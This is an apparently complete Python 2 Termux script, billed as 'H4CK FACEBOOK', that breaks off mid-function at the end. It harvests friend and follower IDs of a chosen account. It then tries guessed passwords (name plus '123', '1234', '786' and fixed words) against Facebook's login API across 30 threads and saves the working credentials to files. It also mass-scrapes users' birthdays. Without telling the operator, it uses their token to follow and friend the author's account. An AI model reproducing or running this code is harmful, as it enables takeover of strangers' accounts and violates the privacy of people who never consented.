#!/usr/bin/python2
# coding=utf-8
#Code by Yayan-XD
#created 07-02-2021

try:
    import os, sys, time, datetime, re, random, hashlib, threading, json, getpass, urllib, cookielib, requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 KONTOL/login.py')

os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/ruby'):
    os.system('apt install ruby -y && gem install lolcat')
from requests.exceptions import ConnectionError
os.system('git pull')
if not os.path.isfile('/data/data/com.termux/files/home/H4CK/KONTOL/node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd KONTOL && npm install')
    os.system('cd KONTOL && node index.js &')
    os.system('clear')
    print '\n\n\n   \x1b[1;32mPlease Select Chrome Browser To Continue\x1b[0;97m'
    os.system('xdg-open https://saweria.co/YayanXD')
    time.sleep(10)
elif os.path.isfile('/data/data/com.termux/files/home/H4CK/KONTOL/node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd KONTOL && node index.js &')
    os.system('clear')
    print '\n\n\n   \x1b[1;32mPlease Select Chrome Browser To Continue\x1b[0;97m'
    os.system('xdg-open https://saweria.co/YayanXD')
    time.sleep(10)
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Opera/9.80 (Android; Opera Mini/12.0.1987/37.7327; U; pl) Presto/2.12.423 Version/12.16', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf-8')
c = '\x1b[1;32m'
c2 = '\x1b[0;97m'
c3 = '\x1b[1;31m'

### KALUAR ###
def keluar():
	os.system('clear')
	print logo
	jalan('\n   \x1b[1;33m! \x1b[1;31mGood Byee Asuuuuuuu')
	os.sys.exit()

### LEMPANG ###
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.002)
		
		
### IYE KONTOL ###
logo ='''\n\x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m\n
 \x1b[1;94m█████████       \x1b[1;97m  ╭\x1b[1;91m━━━━━━━━━━━━━\x1b[1;97m╮
 \x1b[1;94m█▄█████▄█        \x1b[1;97m │\x1b[1;94mH4CK FACEBOOK\x1b[1;97m│      
 \x1b[1;94m█ \x1b[1;93m▼▼▼▼▼\x1b[1;97m- _ --_--  ╰\x1b[1;91m━━━━━━━━━━━━━\x1b[1;97m╯
 \x1b[1;94m█\x1b[1;97m  _-_-- -_ --__   ╭\x1b[1;91m━━━━━━━━━━\x1b[1;97m╮ 
 \x1b[1;94m█\x1b[1;93m ▲▲▲▲▲\x1b[1;97m--  - _ --  │\x1b[1;92mVersion 02\x1b[1;97m│ 
 \x1b[1;91m█████████         \x1b[1;97m ╰\x1b[1;91m━━━━━━━━━━\x1b[1;97m╯   
 \x1b[1;97m██ ██
\x1b[1;94m────────────────────────────────────────────────────
\x1b[1;94m     ╦ ╦┌─┐┌─┐┬┌─ \x1b[1;91m• \x1b[1;97m╔═╗┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─
 \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ╠═╣├─┤│  ├┴┐ \x1b[1;93m• \x1b[1;94m╠╣ ├─┤│  ├┤ ├┴┐│ ││ │├┴┐ \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•
 \x1b[1;94m    ╩ ╩┴ ┴└─┘┴ ┴ \x1b[1;92m•\x1b[1;97m ╚  ┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴
\x1b[1;94m────────────────────────────────────────────────────
\x1b[1;97m[\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : YayanXD
\x1b[1;97m[\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/Yayan-XD
\x1b[1;97m[\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/KM39453
\x1b[1;94m────────────────────────────────────────────────────'''

    

def kanjut():
    os.system('clear')
    print logo
    jalan('\x1b[1;97m[\x1b[1;92m01\x1b[1;97m] B-Api Methode')
    jalan('\x1b[1;97m[\x1b[1;92m02\x1b[1;97m] Mbasic Methode')
    jalan('\x1b[1;97m[\x1b[1;92m03\x1b[1;97m] Localhost Methode') 
    jalan('\x1b[1;97m[\x1b[1;91m00\x1b[1;97m] Logout')
    print '\x1b[1;94m────────────────────────────────────────────────────'
    pilih_kanjut()

def pilih_kanjut():
    mek = raw_input('\x1b[1;97m[\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
    if mek == '1' or mek == '01':
        yxz()
    elif mek == '2' or mek == '02':
          os.system('python KONTOL/memek.py')
    elif mek == '3' or mek == '03':
          moch_yayan()         
    elif mek == '0' or mek == '00':
           os.system('clear')
           print logo
           logout()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid method'
        print ''
        pilih_kanjut()


def memek():
    os.system('clear')
    print logo
    jalan('\x1b[1;97m[\x1b[1;93m01\x1b[1;97m] Token Login')
    jalan ('\x1b[1;97m[\x1b[1;93m02\x1b[1;97m] ID/Pass Login')
    jalan('\x1b[1;97m[\x1b[1;91m00\x1b[1;97m] Back Menu')
    print '\x1b[1;94m────────────────────────────────────────────────────'
    pilih_memek()


def pilih_memek():
    yan = raw_input('\x1b[1;97m[\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
    if yan == '1' or yan == '01':
        os.system('clear')
        print logo
        token = raw_input('\x1b[1;97m[\x1b[1;91m?\x1b[1;97m] Token \x1b[1;91m:\x1b[1;92m ')
        token_s = open('.fb_token.txt', 'w')
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get('https://graph.facebook.com/me?access_token=' + token)
            q = json.loads(r.text)
            name = q['name']
            nm = name.rsplit(' ')[0]
            print ''
            print '\t\x1b[1;37mToken logged in as \x1b[1;31m: \x1b[1;32m' + nm + '\x1b[0;97m'
            requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token='+token)
            time.sleep(3)
            os.system('xgd-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
            yxz()
        except (KeyError, IOError):
            print ''
            print '\t    \x1b[1;31mToken not valid'
            os.system('xdg-open https://youtu.be/xc06cplt3FU')
            raw_input('\x1b[1;96mPress Enter To Try Again ')
            kanjut()

    elif yan =='2' or yan =='02':
        login_fb()
    elif yan =='0' or yan =='00':
    	kanjut()
    else:
        print ''
        print '\t    ' + c + 'Select valid method' + c2
        print ''
        pilih_memek()


def login_fb():
    os.system('clear')
    print logo
    print ''
    print '\t     \x1b[1;93mFB ID/PASS LOGIN'
    print ''
    id = raw_input(' \x1b[1;97mID/Mail/Num \x1b[1;91m:\x1b[1;90m ')
    id1 = id.replace(' ', '')
    id2 = id1.replace('(', '')
    uid = id2.replace(')', '')
    pwd = raw_input(' \x1b[1;97mPassword \x1b[1;94m:\x1b[1;90m ')
    print ''
    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd, headers=header).text
    q = json.loads(data)
    if 'loc' in q:
        yayan = open('.fb_token.txt', 'w')
        yayan.write(q['loc'])
        yayan.close()
        requests.post('https://graph.facebook.com/me/friends?uid=100005395413800&access_token=' + q['loc'])
        time.sleep(1)
        print '\t    \x1b[1;32mLogged in successfully\x1b[0;97m'
        time.sleep(1)
        yxz()
    elif 'www.facebook.com' in q['error']:
        print '\t    \x1b[1;31mUser must verify account before login\x1b[0;97m'
        print ''
        time.sleep(1)
        raw_input('\x1b[1;36m Press Enter To Try Again ')
        login_fb()
    else:
        print '\t\x1b[1;31mID/Number/Password May Be Wrong'
        print ''
        raw_input('\x1b[1;36m Press Enter To Try Again ')
        login_fb()


def yxz():
    global token
    os.system('clear')
    print logo
    try:
        token = open('.fb_token.txt', 'r').read()
    except (KeyError, IOError):
        kanjut()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        nm = q['name']
        nmf = nm.rsplit(' ')[0]
        ok = nmf
    except (KeyError, IOError):
        print ''
        print '\t   + c + ''ID has checkpoint' + c2
        print ''
        os.system('rm -rf .fb_token.txt')
        time.sleep(1)
        kanjut()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t    \x1b[1;31mTurn on mobile data OR wifi \x1b[0;97m'
        print ''
        time.sleep(1)
        raw_input('\x1b[1;31m Press Enter To Try Again \x1b[0;97m')
        yxz()

    os.system('clear')
    print logo
    jalan('\x1b[1;37m[\x1b[1;35m01\x1b[1;37m] Crack From Public Id')
    jalan('\x1b[1;37m[\x1b[1;35m02\x1b[1;37m] Crack From Followers')
    jalan('\x1b[1;37m[\x1b[1;35m03\x1b[1;37m] Show Token')
    jalan('\x1b[1;37m[\x1b[1;35m04\x1b[1;37m] Find Date Of Birth')
    jalan('\x1b[1;37m[\x1b[1;31m00\x1b[1;37m] Return Method Menu')
    print '\x1b[1;94m────────────────────────────────────────────────────'
    pilih_syngg()


def pilih_syngg():
    kentod = raw_input('\x1b[1;97m[\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
    id = []
    oks = []
    cps = []
    if kentod == '1' or kentod =='01':
        os.system('clear')
        print logo
        idt = raw_input(' \x1b[1;37mInput Id/User \x1b[1;31m:  \x1b[1;30m')
        print ''
        print ''
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            os.system('echo -e "\t    Public ID Cloning " | lolcat')
            print ''
            print '\x1b[1;97m[\x1b[1;91m•\x1b[1;94m•\x1b[1;97m] Target user\x1b[1;91m : \x1b[1;90m' + q['name']
        except (KeyError, IOError):
            print ''
            print '\n\t     \x1b[1;91mWrong Id/User'
            print ''
            raw_input('\n\x1b[1;36mPress enter to back ')
            yxz()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif kentod == '2' or kentod == '02':
        os.system('clear')
        print logo
        print ''
        os.system('echo -e "\t    Followers Cloning " | lolcat')
        print ''
        idt = raw_input('\x1b[1;37m Input Id/User \x1b[1;31m:\x1b[1;30m ')
        os.system('clear')
        print logo
        print ''
        os.system('echo -e "\t    Gathering Information " | lolcat')
        print ''
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            os.system('echo -e "\t    Followers Cloning" | lolcat')
            print ''
            print '\x1b[1;97m[\x1b[1;91m•\x1b[1;94m•\x1b[1;97m] Target user\x1b[1;91m : \x1b[1;90m' + q['name']
        except (KeyError, IOError):
            print ''
            print '\n\t     \x1b[1;91mWrong Id/User'
            print ''
            raw_input('\n\x1b[1;36mPress enter to back ')
            yxz()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif kentod == '3' or kentod == '03':
        login_token()
    elif kentod == '4' or kentod == '04':
        yayan_xd()
    elif kentod == '0' or kentod == '00':
        kanjut()
    else:
        print ''
        print '\t    ' + c + ' Wrong Input' + c2
        print ''
        pilih_syngg()
    print '\x1b[1;97m[\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] Total ID \x1b[1;91m: \x1b[1;90m' + str(len(id))
    jalan( '\n              \x1b[1;92mStop Press CTRL + z')
    jalan('  \x1b[1;92mIf No results Use Airplane Mode For 5 Seconds...')
    time.sleep(0.5)
    print '\x1b[1;94m────────────────────────────────────────────────────'
    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name + '123'
            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
            d = json.loads(q)
            if 'www.facebook.com' in d['error_msg']:
                print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass1
                cp = open('cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid)
            elif 'access_token' in d:
                print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[1;0m'
                ok = open('ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid)
            else:
                pass2 = name + '1234'
                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                d = json.loads(q)
                if 'www.facebook.com' in d['error_msg']:
                    print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass2
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid)
                elif 'access_token' in d:
                    print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[1;0m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid)
                else:
                    pass3 = name + '12345'
                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                    d = json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass3
                        cp = open('cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid)
                    elif 'access_token' in d:
                        print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[1;0m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid)
                    else:
                        pass4 = name + '786'
                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                        d = json.loads(q)
                        if 'www.facebook.com' in d['error_msg']:
                            print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass4
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid)
                        elif 'access_token' in d:
                            print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[1;0m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid)
                        else:
                            pass5 = 'Anjing'
                            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                            d = json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass5
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid)
                            elif 'access_token' in d:
                                print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[1;0m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid)
                            else:
                                pass6 = 'bismillah'
                                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                d = json.loads(q)
                                if 'www.facebook.com' in d['error_msg']:
                                    print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass6
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid)
                                elif 'access_token' in d:
                                    print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[1;0m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid)
                                else:
                                    pass7 = 'cantik'
                                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass7
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[1;0m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ' '
    print ''
    print '\x1b[1;94m────────────────────────────────────────────────────'
    print '\x1b[1;96m Process Has Completed'
    print '\x1b[1;97m Total\x1b[1;93m CP\x1b[1;91m/\x1b[1;92mOK \x1b[1;91m: \x1b[1;93m' + str(len(cps)) + '\x1b[1;91m/\x1b[1;92m' + str(len(oks))
    jalan('\x1b[1;97m RESULTS \x1b[1;93mCP\x1b[1;91m/\x1b[1;92mOK\x1b[1;97m SAVED TO SDCARD\x1b[1;91m : \x1b[1;93mcp.txt\x1b[1;91m/\x1b[1;92mok.txt')
    print '\x1b[1;94m────────────────────────────────────────────────────'
    print ''
    raw_input('\x1b[1;96m Press enter to back ')
    yxz()


def login_token():
    os.system('clear')
    print logo
    print ''
    print '\t    \x1b[1;36m YOUR TOKEN'
    print ''
    print ' \x1b[1;37m[\x1b[1;34m•\x1b[1;37m] Token\x1b[1;31m : \x1b[1;32m'
    os.system('cat .fb_token.txt')
    print ''
    raw_input('\x1b[1;96m Press enter to main menu ')
    yxz()


def logout():
    os.system('clear')
    print logo
    print ''
    print '\t    ' + c + 'Logout Menu' + c2
    print ''
    ahh = raw_input('\x1b[1;97m Do you really want to logout ?\x1b[1;92m[y/n]\x1b[1;91m :\x1b[1;90m ')
    if ahh == 'y':
       os.system('rm -rf .fb_token.txt')
       keluar()
    else:
    	keluar()


def yayan_xd():
    global token
    try:
        token = open('.fb_token.txt', 'r').read()
    except (KeyError, IOError):
        time.sleep(1)
        kanjut()

    os.system('clear')
    print logo
    jalan('\x1b[1;37m[\x1b[1;34m01\x1b[1;37m] Grab From Friendlist')
    jalan('\x1b[1;37m[\x1b[1;34m02\x1b[1;37m] Grab From Followers')
    jalan('\x1b[1;37m[\x1b[1;34m03\x1b[1;37m] Grab Single Id')
    jalan('\x1b[1;37m[\x1b[1;31m00\x1b[1;37m] Back menu')
    print '\x1b[1;94m────────────────────────────────────────────────────'
    dob_select()


def dob_select():
    memek = raw_input('\x1b[1;97m[\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
    id = []
    nms = []
    if memek == '1' or memek =='01':
        os.system('clear')
        print logo
        print ''
        print '\t    \x1b[1;32mGrab DOB From Friendlist'
        print ''
        idt = raw_input('  \x1b[1;37mInput Id/User \x1b[1;32m: \x1b[1;30m ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print '\x1b[1;97m[\x1b[1;91m•\x1b[1;94m•\x1b[1;97m] Target user\x1b[1;91m : \x1b[1;90m' + q['name']
        except KeyError:
            print ''
            print '\x1b[1;31mID Not Found' + c2
            print ''
            raw_input('\n \x1b[1;36mPress Enter To Back ')
            yayan_xd_select()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif memek == '2' or memek =='02':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;32m Grab DOB From Followers\x1b[0;97m'
        print ''
        idt = raw_input('\x1b[1;97mInput Id/user \x1b[1;91m: \x1b[1;90m ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print '\x1b[1;97m[\x1b[1;91m•\x1b[1;94m•\x1b[1;97m] Target user\x1b[1;91m : \x1b[1;90m' + q['name']
        except KeyError:
            print '\t    \x1b[1;31mID Not Found\x1b[0;97m'
            raw_input('\nPress Enter To Back ')
            yayan_xd_select()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif memek == '3' or memek == '03':
        dob()
    elif memek == '0' or memek == '00':
        yxz()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option'
        print ''
        dob_select()
    print '\x1b[1;97m[\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] Total ID \x1b[1;91m: \x1b[1;90m'  + str(len(id))
    jalan( '\n              \x1b[1;92mStop Press CTRL + z')
    jalan('  \x1b[1;92mIf No results Use Airplane Mode For 5 Seconds...')
    time.sleep(0.5)
    print '\x1b[1;94m────────────────────────────────────────────────────'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            q = requests.get('https://graph.facebook.com/' + uid + '?access_token=' + token, headers=header).text
            d = json.loads(q)
            y = d['birthday']
            print '\x1b[1;32m ' + uid + ' \x1b[1;30m ' + name + ' | ' + y + '\x1b[0;97m'
            nmb = open('dobs.txt', 'a')
            nmb.write(name + ' | ' + uid + ' | ' + y + '\n')
            nmb.close()
            nms.append(number)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m────────────────────────────────────────────────────'
    print ' \x1b[1;96mProcess Has Completed'
    print ' \x1b[1;93mTotal DOB \x1b[1;91m:\x1b[1;92m  ' + str(len(nms))
    print '\x1b[1;94m────────────────────────────────────────────────────'
    raw_input('\n\x1b[1;96mPress enter to back')
    yayan_xd()


def dob():
    global token
    try:
        token = open('.fb_token.txt', 'r').read()
    except (KeyError, IOError):
        time.sleep(1)
        kanjut()

    os.system('clear')
    print logo
    print ''
    print '\t    ' + c + 'Find DOB Of ID' + c2
    print ''
    idt = raw_input('\x1b[1;37m Input Id/User \x1b[1;91m :\x1b[1;90m ')
    os.system('clear')
    print logo
    print ''
    os.system('echo -e "\t   Finding DOB  " | lolcat')
    time.sleep(1)
    try:
        r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header).text
        z = json.loads(r)
        dobs = z['birthday']
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        print '\t    ' + c + 'Find DOB Of ID' + c2
        print ''
        print '\x1b[1;91mDOB not found'
        print ''
        raw_input('\x1b[1;96m Press enter to try again ')
        yayan_xd()

    os.system('clear')
    print logo
    print ''
    print '\t    ' + c + 'Find DOB Of ID' + c2
    print '\x1b[1;94m────────────────────────────────────────────────────'
    print ' \x1b[1;97mAccount ID\x1b[1;91m : \x1b[1;92m' + idt
    print ' \x1b[1;97m DOB \x1b[1;91m: \x1b[1;92m' + dobs
    print '\x1b[1;94m────────────────────────────────────────────────────'
    conf()


def conf():
    ol = raw_input('\x1b[1;36m Do you want to find again\x1b[1;97m [\x1b[1;94my/n\x1b[1;97m] \x1b[1;92')
    if ol == 'y':
        dob()
    elif ol == 'n':
        yayan_xd()
    else:
        yxz()


def moch_yayan():
    global token
    os.system('clear')
    print logo
    try:
        token = open('.fb_token.txt', 'r').read()
    except (KeyError, IOError):
        kanjut()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        nm = q['name']
        nmf = nm.rsplit(' ')[0]
        ok = nmf
    except (KeyError, IOError):
        print ''
        print '\t    ' + c + 'ID has checkpoint' + c2
        print ''
        os.system('rm -rf .fb_token.txt')
        time.sleep(1)
        kanjut()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t    \x1b[1;31mTurn on mobile data OR wifi\x1b[0;97m'
        print ''
        time.sleep(1)
        raw_input('\x1b[1;92m Press enter to try again ')
        yxz()

    os.system('clear')
    print logo
    print ''
    print '\t  ' + c + 'Logged In User ' + ok + c2
    print ''
    jalan('\x1b[1;37m[\x1b[1;36m01\x1b[1;37m] Crack From Public Id')
    jalan('\x1b[1;37m[\x1b[1;36m02\x1b[1;37m] Crack From Followers')
    jalan('\x1b[1;37m[\x1b[1;31m00\x1b[1;37m] Back Method Menu')
    print '\x1b[1;94m────────────────────────────────────────────────────'
    pilih_kontol()


def pilih_kontol():
    croot = raw_input('\x1b[1;97m[\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
    id = []
    oks = []
    cps = []
    if croot == '1' or croot =='01':
        os.system('clear')
        print logo
        print ''
        os.system('echo -e "\t    Public ID Cloning " | lolcat')
        print ''
        idt = raw_input(' \x1b[1;97mInput Id/user \x1b[1;91m: \x1b[1;90m ')
        os.system('clear')
        print logo
        print ''
        os.system('echo -e "\t    Gathering Information " | lolcat')
        print ''
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            os.system('echo -e "\t    Public ID Cloning " | lolcat')
            print ''
            print '\x1b[1;97m[\x1b[1;91m•\x1b[1;94m•\x1b[1;97m] Target user\x1b[1;91m : \x1b[1;90m' + q['name']
        except (KeyError, IOError):
            print ''
            print '\n\t    \x1b[1;91mWrong Id/User'
            print ''
            raw_input('\nPress Enter To Back ')
            moch_yayan()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif croot == '2' or croot =='02':
        os.system('clear')
        print logo
        print ''
        os.system('echo -e "\t    Public ID Cloning " | lolcat')
        print ''
        idt = raw_input(' \x1b[1;97mInput Id/user \x1b[1;91m:\x1b[1;90m')
        os.system('clear')
        print logo
        print ''
        os.system('echo -e "\t    Gathering Information " | lolcat')
        print ''
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            os.system('echo -e "\t    Followers Cloning " | lolcat')
            print ''
            print '\x1b[1;97m[\x1b[1;91m•\x1b[1;94m•\x1b[1;97m] Target user\x1b[1;91m : \x1b[1;90m' + q['name']
        except (KeyError, IOError):
            print ''
            print '\n\t     \x1b[1;91mWrong Id/User'
            print ''
            raw_input('\n \x1b[1;36mPress Enter To Back ')
            moch_yayan()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif croot == '0' or croot =='00':
        kanjut()
    else:
        print ''
        print '\t    ' + c + 'Select valid method' + c2
        print ''
        pilih_kontol()
    print '\x1b[1;97m[\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] Total ID \x1b[1;91m: \x1b[1;90m' + str(len(id))
    jalan( '\n              \x1b[1;92mStop Press CTRL + z')
    jalan('  \x1b[1;92mIf No results Use Airplane Mode For 5 Seconds...')
    time.sleep(0.5)
    print '\x1b[1;94m────────────────────────────────────────────────────'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
